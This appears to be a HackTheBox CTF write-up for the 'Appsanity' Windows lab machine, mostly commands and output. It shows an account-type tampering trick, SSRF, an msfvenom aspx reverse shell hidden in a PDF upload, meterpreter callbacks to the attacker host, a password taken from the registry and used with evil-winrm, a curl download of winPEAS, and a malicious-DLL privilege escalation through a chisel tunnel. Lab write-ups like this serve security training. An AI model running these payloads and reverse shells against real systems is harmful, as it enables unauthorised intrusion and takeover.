---
title: HackTheBox - Appsanity
date: 2023-11-12 10:22:36
tags: [htb, ctf, writeup, appsanity, nmap, gobuster, ffuf, burpe, msfvenom, metasploit, dnSpy, evil-winrm]
category: writeups
description: ctf writeup for htb appsanity
---

# Tools

- nmap
- gobuster
- ffuf
- burpe
- msfvenom
- netcat
- metasploit
- dnSpy
- Evil-WinRM

<br>

## Getting User

### Nmap

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Appsanity]
└─$ sudo nmap -sS -sV -oA nmap/initial_scan 10.129.46.232
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 06:22 EDT
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 06:23 (0:00:17 remaining)
Nmap scan report for 10.129.46.232
Host is up (0.43s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
443/tcp open  https?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.66 seconds

┌──(kali㉿kali)-[~/HTB/Appsanity]
└─$ sudo nmap -sS -p- -Pn --min-rate 500 -oA nmap/full_tcp_scan 10.129.46.232
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 06:27 EDT
Nmap scan report for 10.129.46.232
Host is up (0.43s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 263.20 seconds

┌──(kali㉿kali)-[~/HTB/Appsanity]
└─$ sudo nmap -sC -sV -oA nmap/script_scan -p 80,443,5985 10.129.46.232
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 06:42 EDT
Nmap scan report for 10.129.46.232
Host is up (0.43s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://meddigi.htb/
443/tcp  open  https?
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.55 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

<br>

### Foothold

add vhost to /etc/hosts

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Appsanity]
└─$ echo "10.129.46.232 meddigi.htb" | sudo tee -a /etc/hosts
10.129.46.232 meddigi.htb
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


enumarating directories using gobuster, found nothing.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Appsanity]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://meddigi.htb -b 404,302    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://meddigi.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404,302
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Using burpe to intercept the request when creating an account, change the account type from 1 to 2 which gives me a doctor's account.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Acctype=2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We get an access_token cookie which looks like a jwt token

access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjgiLCJlbWFpbCI6ImRvY3RvckB3aG8uY29tIiwibmJmIjoxNjk4NTc4Njk2LCJleHAiOjE2OTg1ODIyOTYsImlhdCI6MTY5ODU3ODY5NiwiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.f482mFiYLxXIOctRjncQ8WlE2Wz1v9L9QZwTjAWm0i0;

when decoded we get this payload, nothing useful.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
  "unique_name": "8",
  "email": "doctor@who.com",
  "nbf": 1698578696,
  "exp": 1698582296,
  "iat": 1698578696,
  "iss": "MedDigi",
  "aud": "MedDigiUser"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


fuzzing vhosts we found a portal subdomain

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u https://meddigi.htb -H 'Host: FUZZ.meddigi.htb' -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://meddigi.htb
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.meddigi.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

portal                  [Status: 200, Size: 2976, Words: 1219, Lines: 57, Duration: 325ms]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




I couldn't find the ref.number anywhere.

so I went to `portal.meddigi.htb/Profile` and intercepted the request and the response.
and added *Set-Cookie* header to set the *access_token* in the response

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/2 302 Found
Location: /Profile
Server: Microsoft-IIS/10.0
Strict-Transport-Security: max-age=2592000
Set-Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEwIiwiZW1haWwiOiJkb2N0b3JAd2hvLmNvbSIsIm5iZiI6MTY5ODg0OTIzMywiZXhwIjoxNjk4ODUyODMzLCJpYXQiOjE2OTg4NDkyMzMsImlzcyI6Ik1lZERpZ2kiLCJhdWQiOiJNZWREaWdpVXNlciJ9.8s17W4ZWYU6H_elGsVj-xtI_RDmCnqEcJk4RVF_zPP8; expires=Wed, 01 Nov 2023 16:33:53 GMT; path=/; secure; samesite=strict; httponly
Date: Wed, 01 Nov 2023 14:33:53 GMT
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




which gets us into the doctor's portal profile






Found nothing in Scheduler

Issue Prescription page could be vulnerable to SSRF, I intercepted the request and sent it to repeater





We find the address `http://127.0.0.1:8080/` which allows us to see the reports



I found an aspx reverse shell https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
or we could use msfvenom to create a shell


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Appsanity/files]
└─$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=9998 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 684 bytes
Final size of aspx file: 4565 bytes
Saved as: shell.aspx
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


I went over to Upload Report page and uploaded a blank pdf and intercepted the request
Let's change the extension of our PDF from **.pdf** to **.aspx** and add our shell after `%%EOF`



Change host to your IP and forward the request
and now we can listen to the port using `nc`

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We can head back to the repeater and we should see our report


If we go to the `Raw` tab of the response and scroll down we'll find the `View Report` Link of our uploaded shell which is `ViewReport.aspx?file=2be24979-ddae-4f57-a9e7-d94e44429b64_blank.aspx`
Added it the `Link` parameter `http%3a//127.0.0.1%3a8080/ViewReport.aspx?file=2be24979-ddae-4f57-a9e7-d94e44429b64_blank.aspx` and sent the request


and it spawned a shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.71.74] 65463
Spawn Shell...
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


found user flag in the desktop of the user's folder

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
c:\Users\svc_exampanel\Desktop>type user.txt
type user.txt
ee64bccf15802ae700de4ccf1a4d9944
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

<br>

## Getting Root

### Information Gathering

Going to open a session using metasploit and msfvenom to have a persisting session

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > seet PAYLOAD windows/x64/meterpreter/reverse_https
[-] Unknown command: seet
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.14.71
msf6 exploit(multi/handler) > set LPORT 9998
LPORT => 9998
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > exploit

[*] Started HTTPS reverse handler on https://10.10.14.71:9998
[!] https://10.10.14.71:9998 handling request from 10.129.134.38; (UUID: omvmaxhy) Without a database connected that payload UUID tracking will not work!
[*] https://10.10.14.71:9998 handling request from 10.129.134.38; (UUID: omvmaxhy) Staging x64 payload (201820 bytes) ...
[!] https://10.10.14.71:9998 handling request from 10.129.134.38; (UUID: omvmaxhy) Without a database connected that payload UUID tracking will not work!
[!] https://10.10.14.71:9998 handling request from 10.129.134.38; (UUID: omvmaxhy) Without a database connected that payload UUID tracking will not work!
[*] https://10.10.14.71:9998 handling request from 10.129.134.38; (UUID: omvmaxhy) Staging x64 payload (201820 bytes) ...
[!] https://10.10.14.71:9998 handling request from 10.129.134.38; (UUID: omvmaxhy) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.71:9998 -> 10.129.134.38:62064) at 2023-11-04 06:55:45 -0400
[*] Meterpreter session 2 opened (10.10.14.71:9998 -> 10.129.134.38:62063) at 2023-11-04 06:55:45 -0400

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x64/windows  APPSANITY\svc_exampanel @ APPSANITY  10.10.14.71:9998 -> 10.129.134.38:62064 (10.129.134.38)
  2         meterpreter x64/windows  APPSANITY\svc_exampanel @ APPSANITY  10.10.14.71:9998 -> 10.129.134.38:62063 (10.129.134.38)

msf6 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Found some dlls in `inetpub` folder and downloaded them for inspection

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
meterpreter > dir
Listing: c:\inetpub\ExaminationPanel\ExaminationPanel\bin
=========================================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100666/rw-rw-rw-  591752   fil   2023-09-24 11:46:11 -0400  EntityFramework.SqlServer.dll
100666/rw-rw-rw-  4991352  fil   2023-09-24 11:46:13 -0400  EntityFramework.dll
100666/rw-rw-rw-  13824    fil   2023-09-24 11:46:10 -0400  ExaminationManagement.dll
100666/rw-rw-rw-  40168    fil   2023-09-24 11:46:10 -0400  Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
100666/rw-rw-rw-  206512   fil   2023-09-24 11:46:11 -0400  System.Data.SQLite.EF6.dll
100666/rw-rw-rw-  206520   fil   2023-09-24 11:46:11 -0400  System.Data.SQLite.Linq.dll
100666/rw-rw-rw-  431792   fil   2023-09-24 11:46:11 -0400  System.Data.SQLite.dll
040777/rwxrwxrwx  24576    dir   2023-09-24 11:49:49 -0400  roslyn
040777/rwxrwxrwx  0        dir   2023-09-24 11:49:49 -0400  x64
040777/rwxrwxrwx  0        dir   2023-09-24 11:49:49 -0400  x86
meterpreter > download ExaminationManagement.dll
[*] Downloading: ExaminationManagement.dll -> /home/kali/HTB/Appsanity/ExaminationManagement.dll
[*] Downloaded 13.50 KiB of 13.50 KiB (100.0%): ExaminationManagement.dll -> /home/kali/HTB/Appsanity/ExaminationManagement.dll
[*] Completed  : ExaminationManagement.dll -> /home/kali/HTB/Appsanity/ExaminationManagement.dll

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


I Installed Wine[https://www.winehq.org/] to be able to use dnSpy on Linux to analyze the DLL

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip dnSpy-net-win64.zip -d dnSpy

┌──(kali㉿kali)-[~/Downloads]
└─$ cd dnSpy  

┌──(kali㉿kali)-[~/Downloads/dnSpy]
└─$ wine dnSpy.exe  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Found an encryption key located in the registry


Spawn a shell to query in the registry and search for the key

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
meterpreter > shell
Process 3292 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>reg query HKLM\Software\MedDigi
reg query HKLM\Software\MedDigi

HKEY_LOCAL_MACHINE\Software\MedDigi
    EncKey    REG_SZ    1g0tTh3R3m3dy!!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Got the list of users to try the password on

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
c:\windows\system32\inetsrv>dir C:\Users
dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is F854-971D

 Directory of C:\Users

10/18/2023  05:43 PM    <DIR>          .
10/18/2023  05:43 PM    <DIR>          ..
10/18/2023  06:08 PM    <DIR>          Administrator
09/24/2023  11:16 AM    <DIR>          devdoc
09/15/2023  06:59 AM    <DIR>          Public
10/18/2023  06:40 PM    <DIR>          svc_exampanel
10/17/2023  03:05 PM    <DIR>          svc_meddigi
10/18/2023  07:10 PM    <DIR>          svc_meddigiportal
               0 File(s)              0 bytes
               8 Dir(s)   3,733,925,888 bytes free
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Using Evil-WinRM, we were able to login to devdoc using the password

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Appsanity/files]
└─$ evil-winrm -i meddigi.htb -u devdoc -p "1g0tTh3R3m3dy\!\!"      
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\devdoc\Documents> 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Downloaded winPEAS[https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS] and ran it


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/Tools]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.71.74 - - [01/Nov/2023 13:37:14] "GET /winPEASx64.exe HTTP/1.1" 200 -
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*Evil-WinRM* PS C:\Users\devdoc\Desktop> curl http://10.10.14.71/winPEASx64.exe -o winpeas.exe
*Evil-WinRM* PS C:\Users\devdoc\Desktop> ./winpeas.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


The script tells us about **ReportManagement** which runs on **port 100** and is located in **C:\Program Files\ReportManagement**

Download ReportManagement.exe found in the folder and analyse it using IDA Free

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*Evil-WinRM* PS C:\Program Files\ReportManagement> download ReportManagement.exe
                                        
Info: Downloading C:\Program Files\ReportManagement\ReportManagement.exe to ReportManagement.exe
                                        
Info: Download successful!

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



It tells us about *C:\Program Files\ReportManagement\Libraries* and *externalupload.dll*



Going to *C:\Program Files\ReportManagement\Libraries* , we see *externalupload.dll* doesn't exist.
We can try to create a malicious dll to escalate privilege

<br>

### Privilege Escalation
Create a payload using **msfvenom**  and run a reverse shell in metasploit

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Appsanity/files]
└─$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=1234 -f dll -o externalupload.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 596 bytes
Final size of dll file: 9216 bytes
Saved as: externalupload.dll

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Upload the payload to the Libraries folder

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> upload externalupload.dll
                                        
Info: Uploading /home/kali/HTB/Appsanity/files/externalupload.dll to C:\Program Files\ReportManagement\Libraries\externalupload.dll
                                        
Data: 12288 bytes of 12288 bytes copied
                                        
Info: Upload successful!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Going to use **chisel** to forward *port 100* running on the *victim's machine* to trigger the *upload* function

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Appsanity/files]
└─$ chisel server --port 6666 --reverse
2023/11/04 09:24:07 server: Reverse tunnelling enabled
2023/11/04 09:24:07 server: Fingerprint vzyjBtK8hiIqkFohzO0L1c0qj0XzCUSlGutBa5Farv4=
2023/11/04 09:24:07 server: Listening on http://0.0.0.0:6666
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Upload **chisel.exe** to *devdoc's Desktop* and *forward* port 100

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*Evil-WinRM* PS C:\Users\devdoc\Desktop> upload chisel.exe
                                        
Info: Uploading /home/kali/HTB/Appsanity/files/chisel.exe to C:\Users\devdoc\Desktop\chisel.exe
                                        
Data: 12008104 bytes of 12008104 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\devdoc\Desktop> ./chisel.exe client 10.10.14.71:6666 R:100:127.0.0.1:100
chisel.exe : 2023/11/04 07:39:16 client: Connecting to ws://10.10.14.71:6666
    + CategoryInfo          : NotSpecified: (2023/11/04 07:3...0.10.14.71:6666:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2023/11/04 07:39:18 client: Connected (Latency 293.0101ms)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Now connect to the port using **netcat** which opens the *Report Management admin console* that's running on port 100.
Trigger our payload using *upload* command.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Appsanity]
└─$ nc 127.0.0.1 100
Reports Management administrative console. Type "help" to view available commands.
upload externalupload.dll
Attempting to upload to external source.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


It works and gets us an *admin* session

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://10.10.14.71:1234
[!] https://10.10.14.71:1234 handling request from 10.129.134.38; (UUID: jmuiiwgn) Without a database connected that payload UUID tracking will not work!
[*] https://10.10.14.71:1234 handling request from 10.129.134.38; (UUID: jmuiiwgn) Staging x64 payload (201820 bytes) ...
[!] https://10.10.14.71:1234 handling request from 10.129.134.38; (UUID: jmuiiwgn) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.71:1234 -> 10.129.134.38:62087) at 2023-11-04 10:48:50 -0400
sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x64/windows  APPSANITY\Administrator @ APPSANITY  10.10.14.71:1234 -> 10.129.134.38:62087 (10.129.134.38)

msf6 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getuid
Server username: APPSANITY\Administrator
meterpreter > cd C:/Users/Administrator
meterpreter > cd Desktop
meterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2023-09-24 13:28:16 -0400  desktop.ini
100444/r--r--r--  34    fil   2023-11-04 06:14:15 -0400  root.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 